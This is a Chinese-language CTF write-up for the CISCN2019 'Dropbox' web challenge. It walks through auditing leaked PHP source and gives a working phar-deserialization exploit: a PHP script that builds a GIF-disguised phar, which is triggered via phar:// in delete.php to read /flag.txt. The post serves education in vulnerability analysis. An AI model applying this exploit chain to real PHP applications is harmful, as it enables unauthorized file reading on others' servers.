---
layout: mypost
title: "[CISCN2019 华北赛区 Day1 Web1]Dropbox"
categories: [ctf_wp]
---

（这个题相比于我之前发的那几篇关于反序列化的文章，就是将这种解题的思想具体的贯彻在了一个情景里面，虽然有的地方仍然有点刻意，但不愧是国赛，出的题确实很有水平）

1.这题打开页面是一个登录框，而且既有注册又有登录，脑子里面闪了一下二次注入，但仔细一想单凭这个肯定还没有涉及到从数据库里面直接拿数据，这两个功能点肯定是不存在注入点的，然后注册了一个 admin 的账号，登进去后发现在页面的右上角出现了你好 admin

![](image-20231104164138790-1024x649.png)

我下意识反应这个 admin 有木有可能是从数据库直接带出来的，不过 FUZZ 之后，并没有报错之类的，那基本上判断这个题与这方面无关了，然后查看源码以及开 disearch 扫后也并没有发现可疑的信息。。。

2.一般这样都没结果的话，抓包分析吧，毕竟功能点很简单，就是一个上传文件，然后上传了文件还有一个下载文件的功能点，然后这个上传文件的话，会有一个文件后缀的限制

![](image-20231104165453958-1024x156.png)

这个不好绕欸，一个白名单限制，上传图片马，但是解析不成 php 欸，而且一般文件上传这种题目的话，题目作者也该有暗示之类的，看看下载存不存在洞吧，乐乐乐果然有

![](image-20231104170509211.png)

然后的话，咱们就把它源码里面 include 的源码文件都下载下来，以及一些 register.php 文件啥的按照功能点猜名字的也全部下载下来，大概就是下面图片里面这几个，大家先忽略那个 phar 文件，其他几个 php 的文件都是用这个任意文件下载漏洞下载的

![](image-20231104170810728.png)

然后开始快乐的审计源码环节

3.我审计源码的过程更喜欢是按照功能点流程去一步一步看代码，这里就不说这个 register.php 的源码了，一般这就是用 sql 语句往数据库里面插内容，这题也不例外，然后咱们就从 login.php 开始审计

```
<?php
include "class.php";

if (isset($_GET['register'])) {
    echo "<script>toast('注册成功', 'info');</script>";
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $u = new User();
    $username = (string) $_POST["username"];
    $password = (string) $_POST["password"];
    if (strlen($username) < 20 && $u->verify_user($username, $password)) {
        $_SESSION['login'] = true;
        $_SESSION['username'] = htmlentities($username);
        $sandbox = "uploads/" . sha1($_SESSION['username'] . "sftUahRiTz") . "/";
        if (!is_dir($sandbox)) {
            mkdir($sandbox);
        }
        $_SESSION['sandbox'] = $sandbox;
        echo("<script>window.location.href='index.php';</script>");
        die();
    }
    echo "<script>toast('账号或密码错误', 'warning');</script>";
}
?>
```

上面这个源码包含了一个 class.php，其实大家仔细看看其他文件，会发现每一个文件都会包含这个 class.php 的，这个文件肯定是个核心文件，然后第一个 if 没个啥，看第二个 if 里面把一个类给实例化成了一个对象，咱们来看看 class 中这个 User 类

```
class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}
```

这个类就一个属性，然后咱们这边一实例化首先就是调用一个构造函数，新建了一个全部变量，然后接下来就是判断账密是否一致，这里用了 verify_user（）这个方法，而这里面就用到了我们一开始新建的那个全局变量，然后检查完了如果没问题就创建一个 sandbox 的目录，其他两个函数 user_exist 和 add_user 都是在 register.php 用的，但这个析构函数就很奇怪，合计这 close（）函数也不是关闭数据库的函数欸，这里暂时看不出什么，但可疑点就是这个析构函数，毕竟它在代码中任何作用都没有

4.然后登录了之后，咱们就进入到了首页，接下来再审计这个 index.php

```
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>


    <!DOCTYPE html>
    <html>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>网盘管理</title>

    <head>
        <link href="static/css/bootstrap.min.css" rel="stylesheet">
        <link href="static/css/panel.css" rel="stylesheet">
        <script src="static/js/jquery.min.js"></script>
        <script src="static/js/bootstrap.bundle.min.js"></script>
        <script src="static/js/toast.js"></script>
        <script src="static/js/panel.js"></script>
    </head>

<body>
<nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>

<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

不看别的，果然我一开始想的这个右上角出现了你好 admin 完全没有与数据库交互，是通过这个显示出来的 ‘<?php echo $\_SESSION\['username'\]?>’，然后再看这个也是包含一个 class.php 的，然后实例化了 FileList 这个类，然后访问这个类里面的 Name（）和 Size（）方法，这俩方法很明显就是网站页面上面显示的文件的两个属性了，和上面一样，咱们也是一步一步的去分析

```
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}
```

一开始的话，还是去触发构造函数，注意这里的属性都是数组的形式，然后 sandir 返回的是这个 sandbox 这个文件夹下的所有文件（就是咱们页面上面显示的那几个文件），然后会把.和..这两个文件给删掉，然后是一个 foreach 循环，是先实例化一个类，咱们也是看一下这个 File 类

```
class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
```

首先就是调用 File 里面的 open 函数，如果检查到文件存在，则把这个对象给存到这个$files这个变量里面，然后$this->results\[$file->name()\] = array();这个意思感觉就是要建一个表格了，感觉这个 results 就是页面上那个表格，只不过他现在还是只有文件名，然后是不是发现没东西了，这时候提到咱们刚刚说的 Name（）和 Size（）方法，清楚的可以看到 Filelist 类并没有这两个方法，所以就会触发\_\_call（）这个魔术方法（大家不懂这个是什么的，可以去看看我的这篇文章--正 XOR 反序列化），这个 call（）方法就会调用到 File 类，然后调用里面的 Name 和 Size 方法，然后将结果返回到 results 里面，那么现在就有一个二维数组了

![](image-20231104180850255.png)

就是形成一个类似于这样的结构，最后到了析构函数，就是将这个表打印到页面中

5.OK 相信大家看完以上的内容肯定对这个源码的逻辑有了清晰的认识，咱们现在换一个角度，从攻击者的角度看看怎么去利用，这里看到 File 里面有个 close（）函数，这里面这个函数很危险的，感觉是个反序列化，因为这 pop 链已经很明显了，这个 close 函数就是一开始我起疑心的点，这下这俩刚好联系起来了，如果这题是个常规的反序列化利用的话，我写一下 exp

```
<?php
class User {
    public $db;
}
class File {
    public $filename = "/flag.txt";
}
$a = new User();
$a->db = new File();
?>
```

只要将这个 db 换成 File 类就行，但是呢会发现没有反序列化函数，咋去触发这个析构魔术方法呢，这个就是涉及到 phar 了，反正我也是第一次听，下面写个简单理解

```
我的理解，我们可以把一个序列化的对象，储存在phar格式的文件中，生成后（一定要是生成后），即使我们把格式给改了，也不影响它的作用：用一些文件包含函数，如果我们以phar://协议去访问这个文件，那么就可以把那个对象给反序列化
```

php 一大部分的文件系统函数在通过 phar://伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，别人测试后，受影响的函数如下

![](20180908164943-2151deae-b344-1.png)

然后给大家一个讲 phar 的链接[初探 phar:// - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2715)我就不班门弄斧了

6.然后呢我就尝试把上面这个给弄成一个 phar 文件，然后触发反序列化，但仔细一想，这么写压根都不会在页面回显，那我为什么不利用它本身就有的一个 Call（）魔术方法呢，因为这样会在页面回显，然后就仿照网上一些 wp 自己写了一个 exp

![](image-20231104183235152-1024x483.png)

```
<?php
Class User{
    public $db;

    public function __construct(){
        $this -> db = new FileList();
    }

}

Class FileList{
    private $files;
    private $results;
    private $funcs;

    public function __construct(){
        $this -> files = array(new File());
        $this -> results = array();
        $this -> funcs = array();
    }

}

class File
{
    public $filename;

    public function __construct(){
        $this -> filename = "/flag.txt";
    }

}

$user = new User();

$phar = new Phar("f1ag.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($user);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

7.然后把这个文件改个 gif 的后缀上传上去，这里其实 download.php 和 delete.php 里面都有触发 phar 的函数，但是 download.php 好像被限制了读取目录，所以只能靠删除这个功能来改数据包

![](image-20231104184058337-1024x89.png)

而在 delete.php 中，使用了 File 类的 delete()函数，而 delete()函数中有 unlink()，触发 phar 反序列化，参数为 filename，所以在得到 flag 的时候修改 filename 为 phar://f1ag.gif

![](db6f03e1b642bcd777d25d6db63275ae.png)

8.做个简单的小总结，然后给大家看结果

```
1.上传phar文件
这里可以在upload上传文件，对于PHP，是以关键标识 __HALT_COMPILER();?> 识别phar文件的，所以文件后缀对文件识别没有影响
2.改成 gif/jpg/png 后缀
后端触发反序列化
download.php中filename、delete.php中filename可控
unlink、file_get_contents、isdir、file_exists这些函数在处理 phar文件时都会触发反序列化
但是注意到download.php中限制了访问目录，如果想读到限制目录外的其他目录是不行的，所以由 delete.php来触发
3.执行魔术方法、读取指定文件
如果想要读取文件内容，肯定要利用class.php中的File.close()，但是没有直接调用这个方法的语句；
注意到 User类中在 __destruct时调用了close()，按原逻辑，$db应该是mysqli即数据库对象，但是我们可以构造$db指定为 File对象，这样就可以读取到文件了
可读取到文件不能呈现给我们，注意到 __call魔术方法，这个魔术方法的主要功能就是，如果要调用的方法我们这个类中不存在，就会去File中找这个方法，并把执行结果存入 $this->results[$file->name()][$func]，刚好我们利用这一点：让 $db为 FileList对象，当 $db销毁时，触发 __destruct，调用close()，由于 FileList没有这个方法，于是去 File类中找方法，读取到文件，存入 results
4.返回读取结果
__destruct正好会将 $this->results[$file->name()][$func]的内容打印出来
```

然后给大家康康结果哈

![](image-20231104184756103-1024x271.png)

![](Screenshot_1.png)

OK 我靠终于写完了，思路不难，之所以说这么多就是想带大家理解一下代码的逻辑，从不严谨的逻辑中去发现漏洞，利用漏洞，这也是平时去挖一些白盒漏洞的思路和经历吧，记录一下嘿嘿

![](006APoFYly8h4o30qeuwpj30c80bsmxp.jpg)

Finish!!!